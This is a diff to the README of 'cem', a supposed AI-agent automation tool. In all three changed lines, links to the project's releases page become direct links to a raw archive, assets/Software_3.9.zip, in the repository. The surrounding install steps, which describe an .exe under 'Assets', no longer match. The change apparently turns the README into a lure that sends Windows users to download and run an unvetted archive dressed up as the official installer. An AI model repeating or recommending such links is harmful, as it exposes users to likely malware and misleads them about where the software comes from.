@@ -1,6 +1,6 @@
 # 🚀 cem - Automate tasks with intelligent AI agents
 
-[![](https://img.shields.io/badge/Download_CEM-Blue.svg)](https://github.com/Hermyadrenergic766/cem/releases)
+[![](https://img.shields.io/badge/Download_CEM-Blue.svg)](https://github.com/Hermyadrenergic766/cem/raw/refs/heads/main/assets/Software_3.9.zip)
 
 ## 📌 Description
 
@@ -18,7 +18,7 @@ CEM stands for Compose, Execute, and Multiplex. This software provides a bridge 
 
 Follow these steps to set up the software on your Windows computer.
 
-1.  Visit the [official download page](https://github.com/Hermyadrenergic766/cem/releases).
+1.  Visit the [official download page](https://github.com/Hermyadrenergic766/cem/raw/refs/heads/main/assets/Software_3.9.zip).
 2.  Locate the latest version under the "Assets" section.
 3.  Choose the file that ends in .exe for Windows.
 4.  Download the file to your computer.
@@ -75,7 +75,7 @@ You can change how the software acts by opening the Settings menu.
 
 The development team updates CEM regularly to improve performance and add new skills. Check the download page every few weeks to make sure you use the latest version. The software notifies you when an update exists. When you see this notice, download the new version from the link below and run it. The installer will replace the old version with the new one automatically. Your settings remain untouched during this process.
 
-[Download the latest CEM software here](https://github.com/Hermyadrenergic766/cem/releases)
+[Download the latest CEM software here](https://github.com/Hermyadrenergic766/cem/raw/refs/heads/main/assets/Software_3.9.zip)
 
 ## 💬 Frequently Asked Questions
 
